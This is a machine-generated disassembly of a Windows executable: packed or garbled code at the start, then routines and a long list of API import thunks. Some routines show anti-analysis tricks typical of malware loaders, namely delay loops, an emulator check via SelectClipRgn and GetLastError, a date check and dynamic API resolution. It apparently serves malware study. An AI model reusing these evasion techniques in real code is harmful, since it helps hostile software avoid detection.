stosb [ edi ]
mov ebx 0xadade0d8
retn 0x38c2
sub_4654a6
cmp edi [ ebp + ebp * 4 + 0x26a13aad ]
aaa
add [ 0xffffffffba0a14db ] eax
or [ ebp + ebp * 4 - 0x4662c553 ] edi
push 0xffffffbc
add eax 0xba0e14db
pop ds
mov esp 0x9f3aadad
sahf
xchg esp eax
add eax 0x52ded4db
push edx
push edx
mov edx 0xadadbc6e
cmp dh [ eax - 0x44f5f423 ]
fiadd [ ebx - 0x3d3d5253 ]
fiadd [ esi + 0x53 ]
adc dl cl
das
pop esi
push edx
mov ebx 0xadadaef1
retn 0xd75d
sub_465515
loop r-xdata
scasb [ edi ]
shr [ edi ] 0x1
scasb [ edi ]
push ecx
pop ebp
rcl [ ebp - 0x2552521e ] 0x1
pop ss
out 0xbb al
xlat
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
push edx
push edx
lodsd [ esi ]
daa
mov dl 0xad
vrsqrtss xmm2 xmm5 [ edx + 0x52 ]
mov ebx 0xadadb0b6
retn 0xc2c2
sub_465530
fldcw [ edx + 0x5253563a ]
push edx
mov ebx 0xadade70f
pop ebp
salc
push ss
mov [ 0x37d1adad ] eax
scasb [ edi ]
push edx
fistp [ edi ]
scasb [ edi ]
add eax [ edx ]
mov ebx 0xadadbed1
retn 0xc2c2
sub_46555c
inc edi
cmc
shr [ edx + esi * 2 - 0x1d702fa3 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
pop ss
scasb [ edi ]
shr [ edi ] 0x1
scasb [ edi ]
push ecx
pop ebp
rcl [ ebp - 0x2552521e ] 0x1
pop ss
out 0xbb al
xlat
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4655f6
xor al 0xdb
pop ss
scasb [ edi ]
fild [ edi ]
inc edx
fstp st7
mov esi 0xbaadadaf
and al 0xeb
lodsd [ esi ]
lodsd [ esi ]
fld [ edi ]
pop esi
mov edx 0xadadeb3c
fild [ edi ]
cmpsb [ esi ] [ edi ]
mov edx 0xadadeb34
lodsd [ esi ]
daa
pop edx
fstp st7
mov edx 0xbbadadae
fldpi
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadbac4
retn 0xc2c2
sub_46564e
mov edx 0x4191f04
xchg ebp eax
pop ss
mov esi 0x1f04191f
xchg ebp eax
pop ss
xchg [ edi ] bl
cmp esi [ ecx ]
and [ ebp + 0x213d8a17 ] dl
cmp eax 0x8e179534
jb r-xdata
aaa
cmp al 0x4
xchg ebp eax
pop ss
0x370a1f1f 0x71bb
and al 0x95
pop ss
xchg esi eax
add al 0x1f
and eax 0x9a179533
and [ edi ] dh
add al 0x1f
xchg ebp eax
pop ss
sahf
and eax 0x95372033
pop ss
out 0xa al
sub_4656a3
cmp al 0x4
pop ds
pop ds
mov edx 0xadadbada
or eax 0x92d7090c
pop ebp
salc
push ecx
xchg esp eax
lodsd [ esi ]
lodsd [ esi ]
fistp [ edi ]
xchg bh bl
pop ss
xchg esi eax
mov edx 0xadadba20
xlat
xchg edx eax
pop ebp
salc
mov [ 0x61adad97 ] al
xchg edx eax
fwait
xchg ecx eax
retn 0xc2c2
sub_465888
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov [ ebx ] 0xee
inc ecx
dec edx
jne r-xdata
call sub_403044
mov ebx ecx
add ebx eax
jae r-xdata
sub_4658ac
push ebx
push 0x0
call ReplyMessage
mov ebx 0x9059d83
nop
nop
nop
nop
dec ebx
jne r-xdata
mov eax 0x1c68853d
call sub_4026bc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x5b2c
mov ecx 0x1c68853d
xor edx edx
mov eax ebx
call sub_465888
push 0x0
call ReplyMessage
mov eax ebx
call sub_4026dc
nop
nop
mov ebx 0xbf36
nop
pop ebx
retn
push 0x0
call ReplyMessage
dec ebx
jne r-xdata
push 0x0
call sub_4601a0
nop
nop
pop ebx
retn
sub_465918
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403858#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465944
retn
sub_465948
push ebx
push esi
push edi
mov edi rw-data
sub [ rw-data ] 0x1
jae r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx 0x1798
push 0x0
call ReplyMessage
dec ebx
jne r-xdata
push 0x0
call ReplyMessage
mov ebx 0x256e2
nop
push 0x0
call ReplyMessage
dec ebx
jne r-xdata
nop
nop
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
jne r-xdata
mov eax 0x2b824d6d
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx 0x2b824d6d
xor edx edx
mov eax ebx
call sub_465888
nop
nop
mov eax ebx
call sub_4026dc
nop
nop
push 0x0
call ReplyMessage
mov ebx 0x8ba4
jmp r-xdata
nop
nop
push 0x0
call ReplyMessage
nop
nop
dec ebx
jne r-xdata
nop
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
jne r-xdata
push r-xdata
push r-xdata
call __imp_LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
xor ebx ebx
xor esi esi
nop
nop
push 0x0
call ReplyMessage
nop
nop
jmp r-xdata
cmp eax 0x180
jbe r-xdata
call sub_403044
nop
cmp ebx 0x4
jle r-xdata
nop
nop
add ebx 0x1
jno r-xdata
push 0x0
call ReplyMessage
push 0x0
push 0xcf
call SleepEx
jmp r-xdata
call sub_4658ac
jmp r-xdata
push 0x0
call ReplyMessage
mov esi [ edi + 0x4 ]
call sub_403044
mov [ edi ] 0x8
xor eax eax
mov [ edi + 0x4 ] eax
push edi
call [ rw-data ]
mov eax [ edi + 0x4 ]
sub eax esi
jae r-xdata
sub_465d84
add [ ebx + 0x46 ] bl
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax r-xdata
call sub_405c70
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a0ec
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45a104
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a184
call sub_403d64
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405c70
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a0ec
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45a104
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a184
call sub_403d64
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055c8
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055dc
sub_40121c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401234
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40123c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_403858
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_403858
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_403858
sub_40240a
jmp sub_403858
sub_4026a9
jmp sub_403858
sub_40276c
call sub_405c24
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405c24
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403e3c
sub_402824
push eax
push edx
push ecx
call sub_405c24
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405c24
mov ebx [ eax + 0x4 ]
call sub_405c24
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_4028f8
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402908
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029a4
mov edx [ eax + 0x1c ]
call sub_40295c
retn
sub_402c0c
mov ecx 0xff
call sub_402c18
retn
sub_402c3c
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c58
jmp sub_402c58
sub_402c55
retn
sub_402fe5
jmp sub_403858
sub_403038
fninit
fwait
fldcw [ rw-data ]
retn
sub_403090
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_40309c
push ebx
mov ebx eax
mov eax ebx
call sub_4030cc
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403110
pop ebx
retn
sub_4030b8
push ebx
mov ebx eax
mov eax ebx
call sub_403168
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_4030cc
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4030f4
call sub_403490
test dl dl
jle r-xdata
retn
call sub_403478
sub_4031b4
retn
sub_40323c
jmp sub_403858
sub_403243
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40334c
mov eax 0x8000ffff
retn
sub_403354
retn
sub_403358
retn
sub_40335c
retn
sub_403451
jmp sub_4035a4
sub_403456
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4038b8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403478
sub_403478
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403480
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403490
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4034a0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403568
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403584
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403951
retn
sub_403a94
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b22
jmp sub_4035a4
sub_403b82
jmp sub_4035a4
sub_403b9c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403a94
mov [ rw-data ] 0x0
call sub_403b3c
retn
sub_403cd5
retn
sub_403e37
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e3c
mov [ rw-data ] eax
call sub_403d64
sub_404078
retn
sub_4040b4
retn
sub_4040c2
retn
sub_4040db
retn
sub_4040ec
retn
sub_4041d3
retn
sub_404304
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404320
jmp sub_404320
sub_404369
retn
sub_404371
retn
sub_4043b3
retn
sub_40450c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_404524
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_40467c
retn
sub_40468e
retn
sub_404690
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404884
mov ecx 0x1
jmp sub_4047f0
sub_40488e
retn
sub_4048c4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_4049c8
mov ecx 0x1
jmp sub_4048dc
sub_4049d2
retn
sub_4049d4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404bfa
retn
sub_404bfc
push edx
call sub_4026bc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404884
pop eax
sub_404c10
push eax
call sub_4049c8
pop eax
call sub_4026dc
retn
sub_404c20
mov al 0x11
jmp sub_402818
sub_404c4b
retn
sub_404c5c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b08
pop ebp
retn 0x4
j_sub_4048dc
jmp sub_4048dc
sub_404c71
retn
sub_404c74
call sub_404e14
retn
sub_404ea0
call sub_404e78
retn
sub_4051e9
jmp sub_403858
sub_405354
call sub_40535c
retn
sub_405388
call sub_405398
retn
sub_405390
call sub_4053b8
retn
sub_405398
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405453
jmp sub_4035a4
sub_405474
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
j_sub_403858#5
jmp sub_403858
sub_4054ef
pop ecx
pop ebp
retn
sub_405568
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405574
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405580
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405590
call sub_40309c
mov [ eax + 0x4 ] 0x1
retn
sub_4055c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_4058b7
jmp sub_403858
sub_4058be
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40595b
jmp sub_403858
sub_405962
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4059ab
jmp sub_403858
sub_4059b2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a76
jmp sub_403858
sub_405a7d
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405ace
jmp sub_403858
sub_405ad5
pop ebp
retn
sub_405bac
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405bcc
push eax
push 0x40
call LocalAlloc
retn
sub_405bd8
mov eax 0x10
retn
sub_405c64
mov eax rw-data
call sub_405474
retn
sub_405cd9
jmp sub_403858
sub_405ce0
pop ebp
retn
sub_405ce4
sub [ rw-data ] 0x1
retn
sub_405cec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405d08
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405d51
jmp sub_403858
sub_405d58
pop ebp
retn
sub_405d5c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
__imp_LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406048
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
